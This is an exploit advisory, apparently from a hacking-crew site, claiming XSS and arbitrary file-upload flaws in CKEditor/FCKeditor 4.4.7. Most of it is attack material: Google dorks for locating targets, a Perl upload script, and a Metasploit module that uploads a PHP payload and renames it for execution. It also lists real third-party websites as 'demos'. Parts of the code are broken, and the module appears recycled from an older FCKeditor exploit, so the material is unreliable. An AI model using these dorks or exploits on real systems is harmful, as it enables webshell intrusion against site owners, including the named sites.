###########################################
#-----------------------------------------#
#[ 0-DAY Aint DIE | No Priv8 | KedAns-Dz ]#
#-----------------------------------------#
#     *----------------------------*      #
#  K  |....##...##..####...####....|  .   #
#  h  |....#...#........#..#...#...|  A   #
#  a  |....#..#.........#..#....#..|  N   #
#  l  |....###........##...#.....#.|  S   #
#  E  |....#.#..........#..#....#..|  e   #
#  D  |....#..#.........#..#...#...|  u   #
#  .  |....##..##...####...####....|  r   #
#     *----------------------------*      #
#-----------------------------------------#
#[ Copyright © 2014 | Dz Offenders Cr3w  ]#
#-----------------------------------------#
###########################################
# >>    D_x . Made In Algeria . x_Z    << #
######################################################################
#
# [>] Title : Ckeditor v4.4.7.xx Multiple Vulnerabilities
#
# [>] Author : KedAns-Dz
# [+] E-mail : ked-h (@hotmail.com)
# [+] FaCeb0ok : fb.me/K3d.Dz
# [+] TwiTter : @kedans
#
# [#] Platform : PHP / WebApp
# [+] Cat/Tag : File Upload , XSRF-HTML Injection
#
# [<] <3 <3 Greetings t0 Palestine <3 <3
# [>] ^_^ Greetings to 1337day Users/FAN's <3
# [-] F-ck Hacking , LuV Exploiting
# [!] Vendor : http://ckeditor.com/
# [D] Download : 
#     - http://download.cksource.com/CKEditor/CKEditor/CKEditor%204.4.7/ckeditor_4.4.7_full.zip
#
#######################################################################
#
# [!] Description :
#
# FCKeditor version 4.4.7 is suffer from XSS/HTML Injection and 
# Other multiple vulnerabilities like File Upload (more ex: see-> 
# [ http://1337day.com/search?search_request=ckeditor ]
# remote attacker can use some CKE files to upload remote file or 
# Injecting XSS/HTML Codes.
#
#
#####
#
# [!] Google Dorks : 
# ------------------
# 1- allinurl:"/ckeditor/samples/plugins/htmlwriter"
# 2- allinurl:"/ckeditor/samples/plugins/htmlwriter/outputhtml.html"
# 3- allinurl:"/FCKeditor/_samples/php/sample01.php"
# 4- allinurl:"/FCKeditor/editor/filemanager/browser/default/browser.html"
# 5- allinurl:"/FCKeditor/editor/filemanager"
#
#####
#
# [+] Exploit (1) ' XSS/XSRF/HTML Injection ' :=>
# -----------------------------------------------
#
# - the vuln in htmlwriter plugin :
#
# > http://[target]/[path]/ckeditor/samples/plugins/htmlwriter/outputhtml.html
#
# > Edit & Submit you'r Code just it !
#
#####
#
# [+] Exploit (2) ' File Upload ' :=>
# -----------------------------------
# REF : http://1337day.com/search?search_request=ckeditor
#
# +> Use this PERL Script :=>
# ***********
# #!/usr/bin/perl
#
# use strict;
# use LWP::UserAgent;
# use HTTP::Request::Common;
#  
# print <<INTRO;
# - CKEditor 4.4.x Arbitrary File Upload Exploit
# - Coded By KedAns-Dz
# - Contact: ked-h@hotmail.com
# - Greetings: 1337day , Dz Offenders , All my Homies
# - Copyright (C) 03-2015 - Dz Offenders Cr3w
# INTRO
# print "Target host and Path: ";
# chomp (my $tar=<STDIN>);
# print "Directory / File / Shell: ";
# chomp (my $shell=<STDIN>);
# 
# my $a = LWP::UserAgent->new;
# my $b = $a->request(POST $tar.'/fckeditor/editor/filemanager/browser/upload/php/upload.php';
# Content_Type => 'form-data',
# Content => [ NewFile => $shell ] );
# 
# if ($b->is_success) {
# if (index($b->content, "Disabled") != -1) { print "The webserver is manipulated with your shellcode.\n"; } 
# else { print "Exploit failed! :(\n";
# } else { print "Not connected with Target!\n"; }
#
##########
# *********
# Or wit' that MSF Exploit :=>
#
#
# require 'msf/core'
#  
# class Metasploit3 < Msf::Exploit::Remote
#      Rank = ExcellentRanking
# 
#      include Msf::Exploit::Remote::HttpClient
# 
#      def initialize(info = {})
#          super(update_info(info,
#           'Name' => 'FCKeditor 4.4.x File Upload Code Execution',
#           'Description' => %q{
#              This module exploits a vulnerability in the FCK/CKeditor plugin.
#               By renaming the uploaded file this vulnerability can be used to upload/execute
#               code on the affected system.
#               },
#               'Author' => [ 'KedAns-Dz <ked-h[at]1337day.com>' ],
#               'License' => MSF_LICENSE,
#               'Version'    => '1.0',
#               'References' =>
#               [
#                 ['URL', 'http://1337day.com/search?search_request=ckeditor'],
#               ],
#               'Privileged' => false,
#               'Payload'    =>
#                        {
#                          'DisableNops' => true,
#                          'Compat'      =>
#                             {
#                              'ConnectionType' => 'find',
#                             },
#                          'Space'       => 1024,
#                                },
#                        'Platform'       => 'php',
#                        'Arch'           => ARCH_PHP,
#                        'Targets'        => [[ 'Automatic', { }]],
#                        'DisclosureDate' => '02/05/2011',
#                        'DefaultTarget'  => 0))
# 
#                        register_options(
#                                [
#                                 OptString.new('URI', [true, "CKE Target directory path", "/"]),
#                                ], self.class)
#        end
# 
#        def check
#            uri = ''
#            uri << datastore['URI']
#            uri << '/' if uri[-1,1] != '/'
#            uri << 'fckeditor/editor/filemanager/connectors/php/upload.php?Type=File'
#            res = send_request_raw(
#                {
#                 'uri' => uri
#                }, 25)
# 
#                if (res and res.body =~ /sample16.swf/)
#                   return Exploit::CheckCode::Vulnerable
#                end
# 
#           return Exploit::CheckCode::Safe
#        end
# 
# 
#        def retrieve_obfuscation()
# 
#        end
# 
# 
#        def exploit
# 
#           cmd_php = '<?php ' + payload.encoded + '?>'
# 
#           # Generate some random strings
#           cmdscript       = rand_text_alpha_lower(20)
#           boundary    = rand_text_alphanumeric(6)
# 
#           # Static files
#           directory       = '/fckeditor/editor/images'
#           uri_base    = ''
#           uri_base << datastore['URI']
#           uri_base << '/' if uri_base[-1,1] != '/'
#           uri_base << 'fckeditor/editor/filemanager/connectors/php'
# 
#           # Get obfuscation code (needed to upload files)
#           obfuscation_code = nil
# 
#           res = send_request_raw({
#           'uri'     => uri_base + '/upload.php?Type=File'
#           }, 25)
# 
#           if (res)
# 
#           if(res.body =~ /"obfus", "((\w)+)"\)/)
#             obfuscation_code = $1
#             print_status("Successfully retrieved obfuscation code: #{obfuscation_code}")
#             else
#             print_error("Error retrieving obfuscation code!")
#             return
#            end
# end
# 
#            # Upload shellcode (file ending .ph.p)
#            data = "--#{boundary}\r\nContent-Disposition: form-data; name=\"Filename\"\r\n\r\n"
#            data << "#{cmdscript}.ph.p\r\n--#{boundary}"
#            data << "\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"#{cmdscript}.ph.p\"\r\n"
#            data << "Content-Type: application/octet-stream\r\n\r\n"
#            data << cmd_php
#            data << "\r\n--#{boundary}--"
# 
#            res = send_request_raw({
#            'uri'     => uri_base + "/connector.php?Command=FileUpload&Type=File&CurrentFolder=" + directory + "&obfuscate=#{obfuscation_code}",
#            'method'  => 'POST',
#            'data'    => data,
#            'headers' =>
#                {
#                  'Content-Length' => data.length,
#                  'Content-Type'   => 'multipart/form-data; boundary=' + boundary,
#                }
#             }, 25)
# 
#            if (res and res.body =~ /File Upload Success/)
#               print_status("Successfully uploaded #{cmdscript}.ph.p")
#            else
#               print_error("Error uploading #{cmdscript}.ph.p")
# end
#
#                # Complete the upload process (rename file)
#                print_status("Renaming file from #{cmdscript}.ph.p_ to #{cmdscript}.ph.p")
#                res = send_request_raw({
#                'uri' => uri_base + '/connector.php?Command=FileUpload&Type=File&CurrentFolder=' + directory + '&filetotal=1'
#                })
# 
#                # Rename the file from .ph.p to .php
#                res = send_request_cgi(
#                  {
#                   'method'    => 'POST',
#                   'uri'       => uri_base + '/connector.php?Command=Edit&Type=File&CurrentFolder=',
#                   'vars_post' =>
#                   {
#                     'actionfile[0]' => "#{cmdscript}.ph.p",
#                     'renameext[0]'   => 'p',
#                     'renamefile[0]' => "#{cmdscript}.ph",
#                     'sortby' => 'name',
#                     'sorttype' => 'asc',
#                     'showpage' => '0',
#                     'action' => 'rename',
#                     'commit' => '',
#                    }
#                   }, 10)
# 
#                if (res and res.body =~ /successfully renamed./)
#                        print_status ("Renamed #{cmdscript}.ph.p to #{cmdscript}.php")
#                else
#                        print_error("Failed to rename #{cmdscript}.ph.p to #{cmdscript}.php")
#                end
# 
# 
#                # Finally call the payload
#                print_status("Calling payload: #{cmdscript}.php")
#                uri = ''
#                uri << datastore['URI']
#                uri << '/' if uri[-1,1] != '/'
#                uri << directory + cmdscript + ".php"
#                res = send_request_raw({
#                        'uri'   => uri
#               }, 25)
# 
#        end
# 
# end
#
#
#
###########
#
# Demo's :=>
# http://common.beyondindigopets.com/ckeditor/samples/plugins/htmlwriter/outputhtml.html
# http://heather.cs.ucdavis.edu/ckeditor/samples/plugins/htmlwriter/outputhtml.html
# http://dol-de-bretagne.fr/scripts/FCKeditor/_samples/php/sample01.php
# http://tutor.talkbean.com/front/com/FCKeditor/editor/filemanager/browser/default/browser.html
# http://www.aseat.fr/fckeditor/editor/filemanager/browser/default/browser.html
# Mo in g00glE ;)
#######################################################################
 
####
#  <! THE END ^_* ! , Good Luck all <3 | 0-DAY Aint DIE ^_^ !>
#  Hassi Messaoud (30500) , 1850 city/hood si' elHaouass .<3
#---------------------------------------------------------------
# Greetings to my Homies : Meztol-Dz , Caddy-Dz , Kalashinkov3 , 
# Chevr0sky , Mennouchi.Islem , KinG Of PiraTeS , TrOoN , T0xic,
# & Jago-dz , Over-X , Kha&miX , Ev!LsCr!pT_Dz , Barbaros-DZ , &
# & KnocKout , Angel Injection , The Black Divels , kaMtiEz  , &
# & Evil-Dz , Elite_Trojan , MalikPc , Marvel-Dz , Shinobi-Dz, &
# & Keystr0ke , JF , r0073r , CroSs , Inj3ct0r/Milw0rm 1337day & 
# =( packetstormsecurity.org * metasploit.com * OWASP & OSVDB )=
####
